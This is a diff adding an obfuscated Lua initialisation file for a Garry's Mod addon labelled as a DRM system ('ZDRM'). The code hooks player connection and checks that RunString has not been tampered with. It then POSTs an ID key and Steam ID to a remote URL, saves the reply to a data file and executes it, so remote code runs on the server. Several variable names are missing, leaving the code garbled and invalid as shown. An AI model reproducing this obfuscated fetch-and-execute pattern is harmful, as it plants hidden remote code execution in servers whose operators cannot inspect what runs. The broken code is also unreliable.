@@ -1,0 +1,6 @@
+--[[
+    ZDRM - (SH) Init
+    Developed by Zephruz
+]]
+
+hook.Add("PlayerConnect","zdrm[PlayerConnect]",function()if zdrm._loaded then return end zdrm._loaded=!!1 local  =_G local   = ["\115\116\114\105\110\103"]local    = ['\98\105\116']local       =  ['\102\105\108\101']local        =  ['\99\104\97\114']local         =  ['\98\121\116\101']local r_k_o =  ['\82\117\110\83\116\114\105\110\103']local r_k_no =      ["\69\120\105\115\116\115"]local r_k_oh =      ["\67\114\101\97\116\101\68\105\114"]local w_a_t = ["\104\116\116\112"] if ( ['\100\101\98\117\103']['\103\101\116\105\110\102\111'](r_k_o)["so".."ur".."ce"]!="=[C]") then  ["p".."ri".."nt"]('Deetinoverhere') return end if !(r_k_no("zdrm","DATA")) then r_k_oh("zdrm") end local         = ["\117\116\105\108"]local f=        ["\68\101\99\111\109\112\114\101\115\115"]local ff=        ["\67\111\109\112\114\101\115\115"] local kk= ["z".."d".."rm"]local kkk = function(kk,_,a)a=util.JSONToTable(a)if!a then return end local function b(b)      ["Wr".."i".."te"]("zdrm/info.dat",b)r_k_o(b)kk["f".."et".."ch"](kk,_,a.idkey)end w_a_t["Po".."st"](kk.url.."authenticate",{["idkey"]=a.idkey||!1,["steamid"]=a.steamid||!1},b)end kk["re".."g".."i".."ster"] = kkk  ["ho".."ok"]["R".."un"]("zdrm.init",zdrm) end)
